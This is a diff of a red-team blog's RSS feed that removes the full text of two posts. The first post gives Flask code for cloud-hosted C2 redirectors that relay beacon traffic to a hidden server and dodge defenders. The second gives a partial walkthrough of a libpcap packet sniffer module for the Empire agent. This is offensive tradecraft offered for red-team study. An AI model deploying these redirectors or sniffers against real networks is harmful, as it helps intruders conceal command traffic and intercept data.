@@ -2,2925 +2,341 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Cyber Syndicates</title>
-    <link>https://cybersyndicates.com/index.xml</link>
+    <link>http://cybersyndicates.obscuritylabs.com/</link>
     <description>Recent content on Cyber Syndicates</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>CyberSyndicates</copyright>
     <lastBuildDate>Fri, 21 Apr 2017 21:39:41 -0500</lastBuildDate>
-    <atom:link href="https://cybersyndicates.com/index.xml" rel="self" type="application/rss+xml" />
+    
+	<atom:link href="http://cybersyndicates.obscuritylabs.com/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>Expand Your Horizon Red Team – Modern SaaS C2</title>
-      <link>https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/2017/04/expand-your-horizon-red-team/</link>
       <pubDate>Fri, 21 Apr 2017 21:39:41 -0500</pubDate>
       
-      <guid>https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/</guid>
-      <description>
-
-&lt;p&gt;Well to say that the past month or so for C2 infrastructure has been impactful, would be an understatement. Domain fronting has added yet another card to the deck of tricks the Red Team can deploy. Before this all took place, I was putting in some time to broaden the horizon of how the Red Team could deploy easy, yet effective C2. During this research, I found an interesting solution to this problem. Deploy our C2 redirectors on platforms that often are not intended to have console access. Hopefully to open the horizon of providers and IP space to operate / host from.&lt;/p&gt;
-
-&lt;p&gt;Using Python Flask applications and providers that support WSGI, I was able to put together three new projects to demonstrate this TTP.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;TL;DR&lt;/em&gt; Source code and projects are at the end of the post. The following video shows from nothing to fully functional redirector in one minute flat:&lt;/p&gt;
-
-&lt;p&gt;&lt;iframe src=&#34;https://player.vimeo.com/video/213955360?autoplay=1&amp;loop=1&#34; width=&#34;640&#34; height=&#34;368&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;a href=&#34;https://vimeo.com/213955360&#34;&gt;One Minute C2 Redirector&lt;/a&gt; from &lt;a href=&#34;https://vimeo.com/user52367620&#34;&gt;Alexander Rymdeko-Harvey&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;
-
-&lt;p&gt;For reference we will be covering the following flask redirectors:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/flask_heroku_redirector&#34;&gt;https://github.com/killswitch-GUI/flask_heroku_redirector&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/flask_pythonanywhere_redirector&#34;&gt;https://github.com/killswitch-GUI/flask_pythonanywhere_redirector&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/flask_appengine_redirector&#34;&gt;https://github.com/killswitch-GUI/flask_appengine_redirector&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&#34;native-expansion&#34;&gt;Native Expansion&lt;/h2&gt;
-
-&lt;p&gt;Extensive work has been done by @bluscreenofjeff to filter HTTP traffic via apache mod_rewrite, working off this research I knew Python would also be able to handle this. Using a Python based platform the possibilities are nearly endless in conjunction with providers like Heroku. Sporting the CLI interface, Heroku commands can be used to update system environment variables remotely. This allows for extremely agile manipulation of the redirectors, without the need of multiple stages to filter requests.&lt;/p&gt;
-
-&lt;h2 id=&#34;providers&#34;&gt;Providers&lt;/h2&gt;
-
-&lt;p&gt;limited VPS provides has been an area of concern for myself in the past. Many of the big-name core VPS providers have gotten a bad reputation when it comes to IP blacklisting. Also, one single point of failure to discover all your C2 to pivot off could take place. Adding a few more options to the mix is a great way to throw off defenders, or help spread out your offensive end points. Plus, who is going guess you’re running you C2 from PythonAnywhere.&lt;/p&gt;
-
-&lt;h2 id=&#34;deployment&#34;&gt;Deployment&lt;/h2&gt;
-
-&lt;p&gt;Time is often limited and spending more time than necessary on C2 often means more time off target. A really cool benefit of using SaaS C2 is the ease of code deployments; often we see conventional use cases ranging from quickly standing up a file server to expanding existing infrastructure. This concept makes deploying code a cinch on many platforms, Heroku is a great example of this. If you walk through the setup process of the flask_heroku_redirector, you will notice simple environmental variables to push the configs (Ex. heroku config:set FORWARD_DOMAIN=cybersyndicates.com). This proves to be very powerful to quickly block, change or even pull down payloads you don’t want the Blue Team to hit.&lt;/p&gt;
-
-&lt;h2 id=&#34;ip-space&#34;&gt;IP Space&lt;/h2&gt;
-
-&lt;p&gt;A simple WHOIS query can say a ton about a domain, it will expose potential owner, address and corporation. We can setup WHOIS guard, but that is only half the picture; we need to also look at the IP space we originate from as well. An analyst determining if the traffic is malicious will be asking (Who owns this? Why is this client talking to it? What type of resource?). When we start talking about our operational footprint, considerations like where I host from is a big deal. Take for example third party C2, its near undetectable and will easily circumvent most analytics. The return on investment to blend in and pass the sniff test can be invaluable to sustaining a foot hold. The flask_appengine_redirector project is still dependent on other factors such as a domain name to match the ploy, but provides this initial top cover from operating in Google IP space, without the extent of third party C2.&lt;/p&gt;
-
-&lt;h2 id=&#34;technical-overview&#34;&gt;Technical Overview&lt;/h2&gt;
-
-&lt;p&gt;While each project has its own specifics from the platform dependent configuration files, the core code base is nearly identical across multiple platforms. The first thing you will notice is the common use of OS environment variables. This is common practice for encryption, secret and private keys on these platforms. We use them to allow us to quickly change and alter our C2  redirector, either through the web interface or provider CLI.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# STATIC VAR
-__DEBUG = bool(os.environ.get(&#39;DEBUG&#39;, True))
-__FORWARD_DOMAIN = str(os.environ.get(&#39;FORWARD_DOMAIN&#39;, &#39;cybersyndicates.com&#39;))
-__CURRENT_DOMAIN = str(os.environ.get(&#39;CURRENT_DOMAIN&#39;, &#39;test-1234555555.herokuapp.com&#39;))
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Flask is a great example and standard configuration looks as follows:&lt;/p&gt;
-
-&lt;p&gt;set port to forward on (Defaults to 80):&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;heroku config:set PORT=80&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;set debug output to the log outlet (Defaults to True):&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;heroku config:set DEBUG=True&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;set forward C2 domain (Where to redirect to):&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;heroku config:set FORWARD_DOMAIN=cybersyndicates.com&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;set redirector domain (Incoming domain name):&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;heroku config:set CURRENT_DOMAIN=tranquil-dawn-50102.herokuapp.com&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Once you move on to the core code components you will notice that I also added in a “debug” class to feed your request to. This is very helpful to see the data being received by your C2 since you will not have tools like tcpdump available.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;class debug_request():
-    &amp;quot;&amp;quot;&amp;quot;
-    debug printing of request object.
-    &amp;quot;&amp;quot;&amp;quot;
-    def __init__(self):
-        # setup DB connection
-        # TODO: add db support
-        # self.conn = sql
-        pass
-
-    def log_request(self, request_obj):
-        &amp;quot;&amp;quot;&amp;quot;
-        used to log full request to db or other logging outlet
-        &amp;quot;&amp;quot;&amp;quot;
-        # TODO: build full logic for request
-        req = self.build_json(request_obj)
-        pass
-    
-    def print_request(self, request_obj):
-        &amp;quot;&amp;quot;&amp;quot;
-        print the entire request in json pprint
-        &amp;quot;&amp;quot;&amp;quot;
-        print self.build_json(request_obj)
-
-    def build_json(self, request_obj):
-        &amp;quot;&amp;quot;&amp;quot;
-        build the json obj
-        &amp;quot;&amp;quot;&amp;quot;
-        json_dict = {}
-        json_dict[&#39;url&#39;] = request_obj.url
-        json_dict[&#39;method&#39;] = request_obj.method
-        json_dict[&#39;headers&#39;] = {key: value for (key, value) in request.headers if key != &#39;Host&#39;}
-        json_dict[&#39;method&#39;] = request_obj.cookies
-        json_dict[&#39;data&#39;] = request_obj.data
-        return json.dumps(json_dict, ensure_ascii=False, indent=4, sort_keys=True)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;you should expect to see some verbose logging until you set your debug to false; here is an example of that logging console:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;2017-04-21T22:05:50.027323+00:00 app[web.1]: proxy response: &amp;lt;Response 14718 bytes [200 OK]&amp;gt;
-2017-04-21T22:05:50.098293+00:00 app[web.1]: {
-2017-04-21T22:05:50.098295+00:00 app[web.1]:     &amp;quot;data&amp;quot;: &amp;quot;&amp;quot;,
-2017-04-21T22:05:50.098296+00:00 app[web.1]:     &amp;quot;headers&amp;quot;: {
-2017-04-21T22:05:50.098297+00:00 app[web.1]:         &amp;quot;Accept&amp;quot;: &amp;quot;image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5&amp;quot;,
-2017-04-21T22:05:50.098298+00:00 app[web.1]:         &amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;,
-2017-04-21T22:05:50.098299+00:00 app[web.1]:         &amp;quot;Accept-Language&amp;quot;: &amp;quot;en-us&amp;quot;,
-2017-04-21T22:05:50.098299+00:00 app[web.1]:         &amp;quot;Connect-Time&amp;quot;: &amp;quot;0&amp;quot;,
-2017-04-21T22:05:50.098300+00:00 app[web.1]:         &amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;,
-2017-04-21T22:05:50.098301+00:00 app[web.1]:         &amp;quot;Cookie&amp;quot;: &amp;quot;_ga=GA1.3.1533808371.1492657513; __atuvc=1%7C16&amp;quot;,
-2017-04-21T22:05:50.098301+00:00 app[web.1]:         &amp;quot;Referer&amp;quot;: &amp;quot;https://vast-meadow-71019.herokuapp.com/&amp;quot;,
-2017-04-21T22:05:50.098302+00:00 app[web.1]:         &amp;quot;Total-Route-Time&amp;quot;: &amp;quot;0&amp;quot;,
-2017-04-21T22:05:50.098303+00:00 app[web.1]:         &amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30&amp;quot;,
-2017-04-21T22:05:50.098303+00:00 app[web.1]:         &amp;quot;Via&amp;quot;: &amp;quot;1.1 vegur&amp;quot;,
-2017-04-21T22:05:50.098304+00:00 app[web.1]:         &amp;quot;X-Forwarded-For&amp;quot;: &amp;quot;108.44.160.205&amp;quot;,
-2017-04-21T22:05:50.098305+00:00 app[web.1]:         &amp;quot;X-Forwarded-Port&amp;quot;: &amp;quot;443&amp;quot;,
-2017-04-21T22:05:50.098305+00:00 app[web.1]:         &amp;quot;X-Forwarded-Proto&amp;quot;: &amp;quot;https&amp;quot;,
-2017-04-21T22:05:50.098306+00:00 app[web.1]:         &amp;quot;X-Request-Id&amp;quot;: &amp;quot;514fade7-8222-494f-92f0-388100a01a0f&amp;quot;,
-2017-04-21T22:05:50.098307+00:00 app[web.1]:         &amp;quot;X-Request-Start&amp;quot;: &amp;quot;1492812350097&amp;quot;
-2017-04-21T22:05:50.098307+00:00 app[web.1]:     },
-2017-04-21T22:05:50.098308+00:00 app[web.1]:     &amp;quot;method&amp;quot;: {
-2017-04-21T22:05:50.098308+00:00 app[web.1]:         &amp;quot;__atuvc&amp;quot;: &amp;quot;1%7C16&amp;quot;,
-2017-04-21T22:05:50.098309+00:00 app[web.1]:         &amp;quot;_ga&amp;quot;: &amp;quot;GA1.3.1533808371.1492657513&amp;quot;
-2017-04-21T22:05:50.098310+00:00 app[web.1]:     },
-2017-04-21T22:05:50.098310+00:00 app[web.1]:     &amp;quot;url&amp;quot;: &amp;quot;https://vast-meadow-71019.herokuapp.com/logo.png&amp;quot;
-2017-04-21T22:05:50.098311+00:00 app[web.1]: }
-2017-04-21T22:05:50.098316+00:00 app[web.1]: https://cybersyndicates.com/logo.png
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;One of the powerful aspects of Flask is the ability to use “Custom Decorators” with your Flask app routes. We will be intercepting a “request” object before it hits a flask route. Using a custom decorator we are able to achieve this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;@app.before_request
-@proxy_required
-def log_request():
-    &amp;quot;&amp;quot;&amp;quot;
-    log request and force proxy
-    &amp;quot;&amp;quot;&amp;quot;
-    try:
-        log_outlet = {&#39;address&#39; : request.remote_addr, &#39;url&#39; : request.base_url}
-        print log_outlet
-    except:
-        return make_response(jsonify({&#39;error&#39;: &#39;somthing went wrong (contact admin)&#39;}), 400)
-
-@app.route(&#39;/&amp;lt;string:request_path&amp;gt;&#39;, methods=[&#39;GET&#39;])
-def request_forward(request_path):
-    return &amp;quot;works/n&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;If you look at the above code we have a custom decorator declared as “@app.before_request”, this tells flask to run this code route before sending to the standard route views. Using a custom decorator we “wrap” this function with “@proxy_required”, to intercept the request and manipulate the data:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;def proxy_required(func):
-    &amp;quot;&amp;quot;&amp;quot;
-    proxy http requests to forward domain (our real C2).
-    &amp;quot;&amp;quot;&amp;quot;
-    @wraps(func)
-    def wrapper(*args, **kwargs):
-        &amp;quot;&amp;quot;&amp;quot;
-        wrapper function with decorator
-        &amp;quot;&amp;quot;&amp;quot;
-        try:
-            if __DEBUG:
-                debug_req.print_request(request)
-                print request.url.replace(__CURRENT_DOMAIN, __FORWARD_DOMAIN)
-            # setup our proxy for C2
-            resp = requests.request(
-                method=request.method,
-                url=request.url.replace(__CURRENT_DOMAIN, __FORWARD_DOMAIN),
-                headers={key: value for (key, value) in request.headers if key != &#39;Host&#39;},
-                data=request.get_data(),
-                cookies=request.cookies,
-                allow_redirects=True)
-            excluded_headers = [&#39;content-encoding&#39;, &#39;content-length&#39;, &#39;transfer-encoding&#39;, &#39;connection&#39;]
-            headers = [(name, value) for (name, value) in resp.raw.headers.items()
-                       if name.lower() not in excluded_headers]
-            response = Response(resp.content, resp.status_code, headers)
-            print &amp;quot;proxy response: %s&amp;quot; % (response)
-            return response
-            if not response:
-                # FORWARD RESPONSE TO SERVER
-                return func(*args, **kwargs)
-        except:
-            return make_response(jsonify({&#39;error&#39;: &#39;somthing went wrong (contact admin)&#39;}), 400)
-    return wrapper
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The code will replace the requested URL with the forwarded domain or IP, fix up the request object by pulling the header values and data within the request to build a new request object. Using this object we send it to designated server with all the data and proper headers. This acts as a proxy and returns this entire response object to the original requester.&lt;/p&gt;
-
-&lt;p&gt;Here is a great video of it in action with CobaltStrike:&lt;/p&gt;
-
-&lt;p&gt;&lt;iframe src=&#34;https://player.vimeo.com/video/214249797?autoplay=1&amp;loop=1&#34; width=&#34;640&#34; height=&#34;368&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;a href=&#34;https://vimeo.com/214249797&#34;&gt;Flask Proxy C2 Redirector&lt;/a&gt; from &lt;a href=&#34;https://vimeo.com/user52367620&#34;&gt;Alexander Rymdeko-Harvey&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;
-
-&lt;p&gt;Flask PythonAnywhere C2 redirector template:
-&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/flask_pythonanywhere_redirector&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;p&gt;Google App Engine Flask C2 redirector:
-&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/flask_appengine_redirector&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;p&gt;flask heroku C2 redirector template:
-&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/flask_heroku_redirector&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/2017/04/expand-your-horizon-red-team/</guid>
+      <description>Well to say that the past month or so for C2 infrastructure has been impactful, would be an understatement. Domain fronting has added yet another card to the deck of tricks the Red Team can deploy. Before this all took place, I was putting in some time to broaden the horizon of how the Red Team could deploy easy, yet effective C2. During this research, I found an interesting solution to this problem.</description>
     </item>
     
     <item>
       <title>OS X Packet Capture &amp; Empire</title>
-      <link>https://cybersyndicates.com/2017/02/os-x-packet-capture--empire/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/2017/02/os-x-packet-capture--empire/</link>
       <pubDate>Sun, 12 Feb 2017 21:39:41 -0500</pubDate>
       
-      <guid>https://cybersyndicates.com/2017/02/os-x-packet-capture--empire/</guid>
-      <description>
-
-&lt;p&gt;Recently I have been preparing for some additional support for Empire and the Python agent. With that comes some new modules cooking, finally getting to porting the Linux sniffer over to OS X. While some of you know it’s easy with raw sockets on the Linux side. OS X does not natively support this, and you often see question that relate to how to get this to work on the OS X side.&lt;/p&gt;
-
-&lt;h2 id=&#34;empire&#34;&gt;Empire&lt;/h2&gt;
-
-&lt;p&gt;Empire will be seeing a major release here in the coming months, moving from a single-track windows agent to a platform for OS X, Linux and Windows. Making it extremely agile.&lt;/p&gt;
-
-&lt;p&gt;TL;DR: The following video is the new OS X sniffer module in action&lt;/p&gt;
-
-&lt;p&gt;&lt;iframe src=&#34;https://player.vimeo.com/video/203695405?autoplay=1&amp;loop=1&amp;color=ffffff&#34; width=&#34;640&#34; height=&#34;400&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;a href=&#34;https://vimeo.com/203695405&#34;&gt;Empire OS X Sniffer Module&lt;/a&gt; from &lt;a href=&#34;https://vimeo.com/user52367620&#34;&gt;Alexander Rymdeko-Harvey&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;native-support&#34;&gt;Native Support&lt;/h2&gt;
-
-&lt;p&gt;Native code capability is crucial due the constraints we have, while we do have Python package imports now from memory there is always limitations.  The Empire dev team often focuses on making all modules as cross capable and native.&lt;/p&gt;
-
-&lt;h2 id=&#34;extend-python-with-ctypes-and-dylib&#34;&gt;Extend Python with cTypes and Dylib!&lt;/h2&gt;
-
-&lt;p&gt;One of the major benefits to python is its low-level support, and with cTypes we have those bindings! We can call the standard C library and much more dynamically. Let’s take a look at some the library’s shipped with OS X:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$ ls /usr/lib/ | grep “lib”
-...
-libpq.5.dylib
-libpq.dylib
-libprequelite.dylib
-libproc.dylib
-libpthread.dylib
-libpython.dylib
-libpython2.6.dylib
-libpython2.7.dylib
-libquit.dylib
-libreadline.dylib
-libresolv.9.dylib
-libresolv.dylib
-librpcsvc.dylib
-...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Next we can inspect our .dyblib using &lt;code&gt;nm&lt;/code&gt;  and dumping the export functions in the dynamic library:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$ nm -gU /lib/usr/libpcap.dylib 
-...
-0000000000018c93 T _pcap_dump
-000000000001b28c T _pcap_ng_get_simple_packet_fields
-000000000001e15a T _pcap_ng_init_section_info
-0000000000014088 T _pcap_ng_offline_read
-0000000000013e90 T _pcap_ng_open_offline
-0000000000011a4c T _pcap_not_initialized
-0000000000012f69 T _pcap_offline_filter
-0000000000013f7c T _pcap_offline_read
-0000000000011b1a T _pcap_oneshot
-0000000000012ec6 T _pcap_open_dead
-0000000000012e0c T _pcap_open_dead_with_tstamp_precision
-00000000000122e3 T _pcap_open_live
-0000000000013c13 T _pcap_open_offline
-000000000001249b T _pcap_open_offline_common
-...
-0000000000011ed3 T _pcap_set_snaplen
-0000000000011fc1 T _pcap_set_timeout
-00000000000120f7 T _pcap_set_tstamp_precision
-0000000000011fff T _pcap_set_tstamp_type
-0000000000010c9f T _pcap_set_want_pktap
-0000000000012c37 T _pcap_setdirection
-0000000000012c29 T _pcap_setfilter
-0000000000012b2f T _pcap_setnonblock
-0000000000012b78 T _pcap_setnonblock_fd
-000000000001ca05 T _pcap_setup_pktap_interface
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now comes the ability to extend Python with cTypes and C convention calling. according to Python docs: &amp;ldquo;cdll loads libraries which export functions using the standard cdecl calling convention&amp;rdquo;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;class ctypes.CDLL(name, mode=DEFAULT_MODE, handle=None, use_errno=False, use_last_error=False)
-
-Instances of this class represent loaded shared libraries. Functions in these
-libraries use the standard C calling convention, and are assumed to return int.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;In the code I also setup the standard C lib for future use or other functions you may need such as &lt;code&gt;mmap&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;OSX_PCAP_DYLIB = &#39;/usr/lib/libpcap.A.dylib&#39;
-OSX_LIBC_DYLIB = &#39;/usr/lib/libSystem.B.dylib&#39;
-...
-libc = ctypes.CDLL(OSX_LIBC_DYLIB, use_errno=True)
-...
-pcap = ctypes.CDLL(OSX_PCAP_DYLIB, use_errno=True)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;libpcap-standard-c-program&#34;&gt;libpcap - Standard C Program&lt;/h2&gt;
-
-&lt;p&gt;using &lt;a href=&#34;http://www.devdungeon.com/content/using-libpcap-c&#34;&gt;http://www.devdungeon.com/content/using-libpcap-c&lt;/a&gt; guide on libcap is a great starting point for most. Here is what is impended in Python:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;time.h&amp;gt;
-#include &amp;lt;pcap.h&amp;gt;
-#include &amp;lt;netinet/in.h&amp;gt;
-#include &amp;lt;netinet/if_ether.h&amp;gt;
-
-void print_packet_info(const u_char *packet, struct pcap_pkthdr packet_header);
-
-int main(int argc, char *argv[]) {
-    char *device;
-    char error_buffer[PCAP_ERRBUF_SIZE];
-    pcap_t *handle;
-    const u_char *packet;
-     struct pcap_pkthdr packet_header;
-    int packet_count_limit = 1;
-    int timeout_limit = 10000; /* In milliseconds */
-
-    device = pcap_lookupdev(error_buffer);
-    if (device == NULL) {
-        printf(&amp;quot;Error finding device: %s\n&amp;quot;, error_buffer);
-        return 1;
-    }
-
-    /* Open device for live capture */
-    handle = pcap_open_live(
-            device,
-            BUFSIZ,
-            packet_count_limit,
-            timeout_limit,
-            error_buffer
-        );
-
-     /* Attempt to capture one packet. If there is no network traffic
-      and the timeout is reached, it will return NULL */
-     packet = pcap_next(handle, &amp;amp;packet_header);
-     if (packet == NULL) {
-        printf(&amp;quot;No packet found.\n&amp;quot;);
-        return 2;
-    }
-
-    /* Our function to output some info */
-    print_packet_info(packet, packet_header);
-
-    return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;libpcap-python-implementation&#34;&gt;libpcap - Python Implementation&lt;/h2&gt;
-
-&lt;p&gt;Follow along for the explanation and breakdown or skip to the end for code:&lt;/p&gt;
-
-&lt;h3 id=&#34;interface-device-selection&#34;&gt;Interface Device Selection&lt;/h3&gt;
-
-&lt;p&gt;The next step is to obtain a handle to the interface of choice, as you will see libpcap follows a standard calling convention for setup. We will be using:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;pcap_lookupdev(): finds the default device on which to capture
-
-Returns a pointer  to a string giving the name of a
-network device suitable for use with pcap_create() and pcap_activate(),
-or with  pcap_open_live(),  and with pcap_lookupnet()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;To set this up in Python we need to create a pcap_lookupdev() object and set the res type, this is because by default functions are assumed to return the C int type.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# pcap is our pointer to the dylib function
-pcap_lookupdev = pcap.pcap_lookupdev
-# set the return type to a C char pointer (string)
-pcap_lookupdev.restype = ctypes.c_char_p
-# now get our device device to capture on
-dev = pcap.pcap_lookupdev()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;interface-device-info&#34;&gt;Interface Device Info&lt;/h3&gt;
-
-&lt;p&gt;We have an option to get some data on the device of choice. Using the pcap_lookupnet function we can get some debug data if necessary.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;pcap_lookupnet(): find the IPv4 network number and netmask for a device  
-
-int pcap_lookupnet(const char *device, bpf_u_int32 *netp, 
-    bpf_u_int32 *maskp, char *errbuf);
-
-Is used to determine the IPv4 network number and mask associated with the
-network device. Both netp and maskp are bpf_u_int32 pointers
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We will need to use the proper cTypes unsigned int for the return pointers. We can do this by using cTypes primitive C compatible data types.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;net = ctypes.c_uint()
-mask = ctypes.c_uint()
-pcap.pcap_lookupnet(dev,ctypes.byref(net),ctypes.byref(mask),err_buf)
-if DEBUG:
-    print &amp;quot;* Device IP to bind: %s&amp;quot; % net
-    print &amp;quot;* Device net mask: %s&amp;quot; % mask
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;packet-capture-handle&#34;&gt;Packet Capture Handle&lt;/h3&gt;
-
-&lt;p&gt;Once we have a interface device we need to obtain a capture handle to use with various libpcap capture types. For this we will use the pcap_open_live function.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;pcap_open_live(): open a device for capturing  
-
-pcap_t *pcap_open_live(const char *device, int snaplen,
-        int promisc, int to_ms, char *errbuf);
-Is used to obtain a packet capture handle to look at packets on the network.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We will need to provide the following to the function:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;device = string that specifies the network device to open
-snaplen = specifies the snapshot length to be set on the handle
-promisc = specifies if the interface is to be put into promiscuous mode
-to_ms = specifies the packet buffer timeout in milliseconds
-errbuf = if provided 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Once again we will need to setup the return type, the only difference here is that the return type is pcap_t * structure on success. To do this we will use the ctypes.POINTER() function, which we will provide the type as well:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;ctypes.POINTER(type)
-
-This factory function creates and returns a new ctypes pointer type.
-Pointer types are cached and reused internally, so calling this function
-repeatedly is cheap. type must be a ctypes type.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now implemented in Python:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# static values 
-PCAP_ERRBUF_SIZE = 256
-PCAP_CAPTURE_COUNT = 1000
-promisc = ctypes.c_int(1)
-# setup the return pointer 
-pcap_open_live = pcap.pcap_open_live
-pcap_open_live.restype = ctypes.POINTER(ctypes.c_void_p)
-# get pcap_handle pointer
-pcap_handle = pcap.pcap_open_live(dev, 1024, promisc, timeout_limit, err_buf)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;check-our-handle&#34;&gt;Check Our Handle&lt;/h3&gt;
-
-&lt;p&gt;As all good programing practices say we should check our handle, this will insure we have a handle/interface that can go into monitor mode. To do this we will use pcap_can_set_rfmon.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;pcap_can_set_rfmon(): checks whether monitor mode could be set on a capture
-handle when the handle is activated
-
-pcap_set_rfmon() returns 0 if monitor mode could not be set, 
-1 if monitor mode could be se
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Impmentation:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;pcap_can_set_rfmon = pcap.pcap_can_set_rfmon
-pcap_can_set_rfmon.argtypes = [ctypes.c_void_p]
-if (pcap_can_set_rfmon(pcap_handle) == 1):
-    if DEBUG:
-        print &amp;quot;* Can set interface in monitor mode&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;setup-dump-file&#34;&gt;Setup Dump File&lt;/h3&gt;
-
-&lt;p&gt;If you take a look at the raw socket sniffer in Empire &lt;a href=&#34;https://github.com/killswitch-GUI/NIX-Sniffer-Examples/blob/master/linux-socket-sniffer.py#L40&#34;&gt;https://github.com/killswitch-GUI/NIX-Sniffer-Examples/blob/master/linux-socket-sniffer.py#L40&lt;/a&gt; it creates the pcap header and file header manually. Using the libpcap lib we can use pcap_dump_open() to handle this for us. Using the pcap_dump() function we can call this pointer for the packet handling.&lt;/p&gt;
-
